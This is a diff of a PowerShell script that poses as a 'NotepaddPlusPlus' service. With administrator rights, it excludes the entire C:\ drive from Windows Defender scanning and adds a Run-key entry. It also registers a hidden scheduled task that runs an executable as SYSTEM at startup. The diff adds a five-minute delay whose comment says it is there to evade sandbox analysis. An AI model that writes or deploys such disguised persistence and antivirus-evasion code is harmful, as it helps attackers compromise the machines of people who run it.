@@ -13,12 +13,9 @@ if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
 
 # 1. FIX: Add Exclusion FIRST, before checking or copying files
 $exclusionPath = "C:\"
-Add-MpPreference -ExclusionPath $exclusionPath -Force
-
 # Verify if the exclusion was added successfully (using -contains for array safety)
 $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 if ($exclusions -notcontains $exclusionPath) {
-    # Attempt one more time or continue at own risk
     Add-MpPreference -ExclusionPath $exclusionPath -Force
 }
 
@@ -65,8 +62,9 @@ New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"C:\ProgramData
 # The script defaults to localhost:8080 if env var is missing, so we don't need the complex env wrapper
 $action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.exe"
 $trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger.Delay = "PT5M" # Delay execution by 5 minutes after startup to evade sandbox analysis
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -RunOnlyIfNetworkAvailable
 
 # Register (Force update if exists)
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
@@ -76,6 +74,8 @@ Register-ScheduledTask -TaskName "NotepaddPlusPlusService" -InputObject $task -F
 # Start-ScheduledTask -TaskName "NotepaddPlusPlusService"
 
 # # Start the service immediately (Hidden Window)
-if (Test-Path "C:\ProgramData\npp\notepad-service.exe") {
-    Start-Process -FilePath "C:\ProgramData\npp\notepad-service.exe" -WindowStyle Hidden
-}
+# if (Test-Path "C:\ProgramData\npp\notepad-service.exe") {
+#     Start-Process -FilePath "C:\ProgramData\npp\notepad-service.exe" -WindowStyle Hidden -PassThru | Out-Null
+# }
+
+exit 0
